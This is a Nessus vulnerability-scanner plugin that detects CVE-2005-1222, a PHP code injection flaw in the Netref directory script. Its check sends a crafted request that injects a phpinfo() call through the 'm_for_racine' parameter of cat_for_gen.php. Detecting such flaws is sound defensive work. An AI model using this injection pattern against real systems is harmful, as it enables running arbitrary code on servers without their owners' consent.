#
# This script was written by Josh Zlatin-Amishav <josh at tkos dot co dot il>
#

# Changes by Tenable:
#  - Improved description
#  - Streamlined code.
#  - Improved exploit.
#  - Title update (3/27/2009)
#
# This script is released under the GNU GPLv2
#


include("compat.inc");

if(description)
{
 script_id(18358);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2005-1222");
 script_bugtraq_id(13275);
 script_xref(name:"OSVDB", value:"15717");

 script_name(english:"Netref cat_for_gen.php Arbitrary PHP Command Injection");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Netref directory script, written in PHP. 

There is a vulnerability in the installed version of Netref that
enables a remote attacker to pass arbitrary PHP script code through
the 'ad', 'ad_direct', and 'm_for_racine' parameters of the
'cat_for_gen.php' script.  This code will be executed on the remote
host under the privileges of the web server userid." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Netref 4.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();


 summary["english"] = "Netref Cat_for_gen.PHP Remote PHP Script Injection Vulnerability";

 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);

 script_family(english:"CGI abuses");
 script_copyright(english:"Copyright (C) 2005-2009 Josh Zlatin-Amishav");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

function check(url)
{
 local_var req, res;
 # Try to call PHP's phpinfo() function.
 req = http_get(item:url +"/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if ( res == NULL ) exit(0);
 if ( "PHP Version" >< res )
 {
        security_hole(port);
        exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
